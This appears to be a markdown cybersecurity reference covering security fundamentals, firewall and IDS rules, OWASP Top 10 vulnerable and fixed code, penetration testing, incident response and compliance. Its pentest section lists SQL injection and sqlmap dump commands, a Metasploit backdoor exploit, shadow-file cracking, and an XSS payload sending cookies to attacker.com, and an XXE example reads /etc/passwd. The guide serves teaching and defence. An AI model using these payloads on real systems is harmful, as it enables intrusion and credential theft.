# Cybersecurity & Threat Detection 2025

**Updated**: 2025-11-24 | **Focus**: Security Architecture, Penetration Testing, Incident Response, Compliance

---

## Security Fundamentals

```markdown
CIA TRIAD:

CONFIDENTIALITY:
- Data accessible only to authorized users
- Methods: Encryption, access control, authentication
- Example: Medical records encrypted, requires password + 2FA

INTEGRITY:
- Data accurate, unaltered
- Methods: Hashing, digital signatures, checksums
- Example: Software download hash (SHA-256) verifies file not tampered

AVAILABILITY:
- Data/systems accessible when needed
- Methods: Redundancy, backups, DDoS protection
- Example: 99.9% uptime SLA, failover servers

---

DEFENSE IN DEPTH (Layered security):

LAYERS:
1. PHYSICAL: Locked server room, badge access, cameras
2. NETWORK: Firewall, IDS/IPS, segmentation (VLANs)
3. HOST: Antivirus, EDR (endpoint detection), patch management
4. APPLICATION: Input validation, secure coding, WAF
5. DATA: Encryption at rest, encryption in transit (TLS)
6. USER: Security awareness training, phishing simulations

PRINCIPLE: No single point of failure (one layer breached, others protect)

---

LEAST PRIVILEGE:
- Users/systems: Minimum access needed to perform job
- Example: Developer access to dev environment only (not production)
- Benefits: Limits damage from compromised account, insider threats

ZERO TRUST:
- "Never trust, always verify"
- Assume breach (verify every request, even internal)
- Methods: MFA, micro-segmentation, continuous monitoring
```

---

## Network Security

```bash
# FIREWALL (Filter traffic, allow/deny based on rules)

# IPTABLES (Linux firewall)

# Allow SSH from specific IP
sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT

# Allow HTTP/HTTPS from anywhere
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Drop all other incoming traffic (default deny)
sudo iptables -P INPUT DROP

# Allow outgoing traffic
sudo iptables -P OUTPUT ACCEPT

# Save rules
sudo iptables-save > /etc/iptables/rules.v4

---

# IDS/IPS (Intrusion Detection/Prevention System)

# SNORT (Open-source IDS)

# Rule format: action protocol src_ip src_port -> dst_ip dst_port (options)

# Alert on SQL injection attempt
alert tcp any any -> any 80 (msg:"SQL Injection Attempt"; content:"union select"; nocase; sid:1000001;)

# Alert on SSH brute force (5+ attempts in 60 sec)
alert tcp any any -> any 22 (msg:"SSH Brute Force"; threshold:type both, track by_src, count 5, seconds 60; sid:1000002;)

# Block known malicious IP
drop ip 1.2.3.4 any -> any any (msg:"Blocked malicious IP"; sid:1000003;)

---

# VPN (Virtual Private Network, encrypted tunnel)

# OPENVPN (Setup server)

# Install
sudo apt install openvpn easy-rsa

# Generate certificates
make-cadir ~/openvpn-ca
cd ~/openvpn-ca
./easyrsa init-pki
./easyrsa build-ca
./easyrsa gen-req server nopass
./easyrsa sign-req server server
./easyrsa gen-dh

# Server config (/etc/openvpn/server.conf)
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh.pem
server 10.8.0.0 255.255.255.0
push "redirect-gateway def1 bypass-dhcp"
push "dhcp-option DNS 8.8.8.8"

# Start server
sudo systemctl start openvpn@server

---

# NETWORK SEGMENTATION (VLANs, separate sensitive systems)

# Example: DMZ (Demilitarized Zone)
# Internet → Firewall → DMZ (web servers) → Firewall → Internal Network (databases, file servers)
# Benefit: Compromised web server can't directly access internal network

---

# PORT SCANNING (Reconnaissance, find open ports)

# NMAP (Network Mapper)

# Basic scan (common ports)
nmap 192.168.1.1

# Full port scan (all 65535 ports)
nmap -p- 192.168.1.1

# Service/version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.1

# Scan subnet
nmap 192.168.1.0/24

# Scan and output to file
nmap -oN scan_results.txt 192.168.1.1

---

# WIRESHARK (Packet analyzer, capture network traffic)

# Capture filters (applied during capture, reduces data)
tcp port 80                 # HTTP traffic only
host 192.168.1.1            # Traffic to/from specific IP
net 192.168.1.0/24          # Traffic in subnet

# Display filters (applied after capture, analyze)
http.request.method == "POST"           # HTTP POST requests
ip.addr == 192.168.1.1                  # Packets from/to IP
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN packets (connection initiation)
dns.qry.name contains "malware"         # DNS queries containing "malware"

# Follow TCP stream (see entire conversation)
Right-click packet → Follow → TCP Stream
```

---

## Application Security

```python
# COMMON VULNERABILITIES (OWASP Top 10)

# 1. INJECTION (SQL, command, LDAP)

# VULNERABLE (SQL Injection)
username = request.GET['username']
password = request.GET['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
# Attacker input: username=' OR '1'='1' --
# Query becomes: SELECT * FROM users WHERE username='' OR '1'='1' -- AND password=''
# Returns all users (bypasses authentication)

# SECURE (Parameterized queries)
username = request.GET['username']
password = request.GET['password']
query = "SELECT * FROM users WHERE username=%s AND password=%s"
cursor.execute(query, (username, password))
# User input treated as data, not code (injection impossible)

---

# 2. BROKEN AUTHENTICATION

# VULNERABLE (Weak session management)
# Session ID in URL: https://bank.com/account?sessionid=12345
# Risk: Session fixation, session hijacking (URL shared, logged)

# SECURE
# Session ID in HTTP-only cookie (not accessible via JavaScript, XSS protection)
# Regenerate session ID after login (prevent session fixation)
# Session timeout (15-30 min inactivity)
# Logout destroys session server-side

---

# 3. SENSITIVE DATA EXPOSURE

# VULNERABLE (Plain text passwords in database)
password = request.POST['password']
db.execute(f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')")
# If database breached, all passwords exposed

# SECURE (Hash + salt)
import bcrypt

# Hashing (one-way, can't reverse)
password = request.POST['password'].encode('utf-8')
hashed = bcrypt.hashpw(password, bcrypt.gensalt())
db.execute("INSERT INTO users (username, password) VALUES (%s, %s)", (username, hashed))

# Verification (compare hash)
stored_hash = db.fetch_one("SELECT password FROM users WHERE username=%s", (username,))
if bcrypt.checkpw(password, stored_hash):
    # Login successful
    pass

---

# 4. XML EXTERNAL ENTITIES (XXE)

# VULNERABLE
import xml.etree.ElementTree as ET
xml_data = request.POST['xml']
tree = ET.fromstring(xml_data)
# Attacker input:
# <?xml version="1.0"?>
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <user><name>&xxe;</name></user>
# Reads /etc/passwd file

# SECURE (Disable external entities)
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_data)  # Safely parses XML, blocks XXE

---

# 5. BROKEN ACCESS CONTROL

# VULNERABLE (IDOR - Insecure Direct Object Reference)
user_id = request.GET['user_id']
user_data = db.fetch_one(f"SELECT * FROM users WHERE id={user_id}")
# Attacker changes URL: /profile?user_id=123 → /profile?user_id=456
# Access other users' data

# SECURE (Check authorization)
user_id = request.GET['user_id']
logged_in_user = session['user_id']

if user_id != logged_in_user:
    return "Unauthorized", 403

user_data = db.fetch_one("SELECT * FROM users WHERE id=%s", (user_id,))

---

# 6. SECURITY MISCONFIGURATION

# VULNERABLE
# Default credentials (admin/admin)
# Unnecessary services running (FTP, Telnet)
# Error messages expose stack traces, database structure

# SECURE
# Change default credentials
# Disable unused services
# Custom error pages (don't expose internals)
# Security headers (see below)

---

# 7. CROSS-SITE SCRIPTING (XSS)

# VULNERABLE (Reflected XSS)
search_query = request.GET['q']
return f"<p>You searched for: {search_query}</p>"
# Attacker input: <script>alert('XSS')</script>
# Browser executes script (steal cookies, redirect to phishing)

# SECURE (Escape output)
from html import escape
search_query = request.GET['q']
return f"<p>You searched for: {escape(search_query)}</p>"
# Output: &lt;script&gt;alert('XSS')&lt;/script&gt; (displayed as text, not executed)

---

# 8. INSECURE DESERIALIZATION

# VULNERABLE (Python pickle)
import pickle
data = request.POST['data']
obj = pickle.loads(data)  # Deserializes data
# Attacker sends malicious serialized object (executes code)

# SECURE (Use JSON, validate input)
import json
data = request.POST['data']
obj = json.loads(data)  # JSON can't execute code
# Validate structure, types

---

# 9. USING COMPONENTS WITH KNOWN VULNERABILITIES

# VULNERABLE (Outdated libraries)
# Log4Shell (2021): Log4j vulnerability (RCE - Remote Code Execution)
# Heartbleed (2014): OpenSSL vulnerability (memory leak, private keys exposed)

# SECURE
# Keep dependencies updated (npm audit, pip list --outdated)
# Automated scanning (Snyk, Dependabot, OWASP Dependency-Check)
# Monitor CVEs (Common Vulnerabilities and Exposures)

---

# 10. INSUFFICIENT LOGGING & MONITORING

# VULNERABLE (No logs, can't detect breach)
# Attacker compromises system, no evidence

# SECURE (Log security events)
import logging

logger = logging.getLogger(__name__)

# Log failed login attempts
if not authenticate(username, password):
    logger.warning(f"Failed login attempt for user: {username} from IP: {request.remote_addr}")

# Log privilege escalation
if user.role != 'admin' and request.path == '/admin':
    logger.critical(f"Unauthorized admin access attempt by user: {username}")

# Centralized logging (SIEM: Splunk, ELK Stack)
# Alerts (5 failed logins in 1 min → alert security team)
```

---

## Penetration Testing

```bash
# RECONNAISSANCE (Passive, gather info without touching target)

# WHOIS (Domain registration info)
whois example.com

# DNS enumeration
dig example.com
nslookup example.com

# Subdomain enumeration
sublist3r -d example.com

# Google dorking (find exposed info)
site:example.com filetype:pdf
site:example.com inurl:admin

---

# SCANNING (Active, probe target)

# NMAP (Port scan, service detection)
nmap -sV -sC -oN nmap_results.txt 192.168.1.1

# NIKTO (Web vulnerability scanner)
nikto -h http://example.com

# DIRB (Directory brute-force, find hidden paths)
dirb http://example.com /usr/share/wordlists/dirb/common.txt

---

# EXPLOITATION (Gain access)

# METASPLOIT (Exploitation framework)

# Start Metasploit
msfconsole

# Search exploit
search vsftpd

# Use exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Set target
set RHOST 192.168.1.100

# Run exploit
exploit

# If successful, get shell
sessions -i 1

---

# SQL INJECTION (Manual testing)

# Test for vulnerability
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*

# Enumerate database
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

# Extract data
' UNION SELECT username, password, NULL FROM users --

---

# SQLMAP (Automated SQL injection)

# Test URL for SQLi
sqlmap -u "http://example.com/page?id=1" --dbs

# Dump database
sqlmap -u "http://example.com/page?id=1" -D database_name --tables
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --columns
sqlmap -u "http://example.com/page?id=1" -D database_name -T users -C username,password --dump

---

# XSS TESTING

# Reflected XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# Stored XSS (comment field, user profile)
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

---

# BURP SUITE (Web proxy, intercept/modify HTTP requests)

# Proxy → Intercept → Modify request/response
# Repeater (resend request, test different inputs)
# Intruder (automated attacks, brute-force, fuzzing)
# Scanner (automated vulnerability scan, paid version)

---

# PASSWORD CRACKING

# JOHN THE RIPPER (Hash cracking)

# Crack /etc/shadow (Linux password hashes)
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow

# Show cracked passwords
john --show /etc/shadow

# HASHCAT (GPU-accelerated, faster)

# Crack MD5 hashes
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Modes: -m 0 (MD5), -m 1000 (NTLM), -m 1800 (SHA-512)
# Attacks: -a 0 (dictionary), -a 3 (brute-force)

---

# PRIVILEGE ESCALATION (After initial access, gain root/admin)

# LINUX:
# Check sudo permissions
sudo -l

# SUID binaries (run as owner, often root)
find / -perm -4000 2>/dev/null

# Kernel exploits (Dirty COW, etc.)
uname -a  # Check kernel version
searchsploit linux kernel 4.4.0  # Find exploits

# WINDOWS:
# Check privileges
whoami /priv

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Token impersonation (if SeImpersonatePrivilege enabled)
# Use tools: Juicy Potato, PrintSpoofer
```

---

## Incident Response

```markdown
INCIDENT RESPONSE PHASES (NIST):

1. PREPARATION:
   - Incident response plan (procedures, contacts)
   - Tools (forensics, backups, monitoring)
   - Training (tabletop exercises, simulations)

2. DETECTION & ANALYSIS:
   - Indicators of Compromise (IOCs):
     * Unusual network traffic (C2 beaconing)
     * Failed login attempts (brute force)
     * New user accounts (persistence)
     * Modified system files (rootkit)
   - SIEM alerts (correlate events)
   - User reports (suspicious email, slow system)
   - Triage (severity, scope, impact)

3. CONTAINMENT:
   - SHORT-TERM:
     * Isolate infected systems (disconnect from network)
     * Block malicious IPs/domains (firewall, DNS)
     * Disable compromised accounts
   - LONG-TERM:
     * Patch vulnerabilities
     * Rebuild systems (clean image)

4. ERADICATION:
   - Remove malware (antivirus, manual deletion)
   - Close backdoors (remove unauthorized accounts, services)
   - Patch vulnerabilities (prevent re-infection)

5. RECOVERY:
   - Restore systems (from clean backups)
   - Monitor for reinfection (IOC hunting)
   - Gradual return to normal operations

6. POST-INCIDENT ACTIVITY:
   - Lessons learned (what worked, what didn't)
   - Update procedures (improve response)
   - Root cause analysis (how did breach occur?)

---

FORENSICS (Preserve evidence, analyze):

CHAIN OF CUSTODY:
- Document: Who accessed evidence, when, why
- Integrity: Hash evidence (SHA-256), ensure unaltered
- Legal admissibility (if criminal case)

TOOLS:
- Disk imaging: dd, FTK Imager (copy entire drive, bit-by-bit)
- Memory analysis: Volatility (extract processes, network connections from RAM dump)
- Log analysis: grep, ELK Stack (correlate events, timeline)
- Network forensics: Wireshark (analyze packet captures)

ORDER OF VOLATILITY (Most to least volatile):
1. CPU registers, cache
2. RAM (memory)
3. Network connections, processes
4. Disk (files, logs)
5. Backups, archives
```

---

## Compliance & Standards

```markdown
FRAMEWORKS:

NIST CYBERSECURITY FRAMEWORK:
- Identify (assets, risks)
- Protect (access control, training)
- Detect (monitoring, anomaly detection)
- Respond (incident response plan)
- Recover (backups, continuity)

ISO 27001 (Information Security Management System):
- Risk assessment
- Security policies
- Access control
- Cryptography
- Incident management
- Audit, compliance

---

REGULATIONS:

GDPR (General Data Protection Regulation, EU):
- Personal data protection (consent, purpose limitation)
- Data breach notification (72 hours)
- Right to erasure ("right to be forgotten")
- Fines: Up to €20M or 4% global revenue

HIPAA (Health Insurance Portability and Accountability Act, US):
- Protect health information (PHI)
- Encryption, access control, audit logs
- Fines: Up to $1.5M per violation

PCI DSS (Payment Card Industry Data Security Standard):
- Protect cardholder data (credit/debit cards)
- Requirements: Firewall, encryption, antivirus, access control
- Quarterly scans, annual audits

SOC 2 (Service Organization Control 2):
- Cloud/SaaS security (trust principles: security, availability, confidentiality, privacy)
- Type I (design), Type II (operating effectiveness over time)
```

---

## Key Takeaways

1. **Assume breach** - Zero trust, defense in depth (multiple layers)
2. **Patch quickly** - Most breaches exploit known vulnerabilities (update software)
3. **Monitor continuously** - Detect threats early (SIEM, alerts, anomaly detection)
4. **Least privilege** - Limit access (reduce blast radius)
5. **Incident readiness** - Plan, test, practice (tabletop exercises, breach simulations)

---

## References

- "The Web Application Hacker's Handbook" - Dafydd Stuttard
- OWASP Testing Guide, Top 10
- NIST Cybersecurity Framework

**Related**: `penetration-testing-methodology.md`, `incident-response-playbook.md`, `zero-trust-architecture.md`
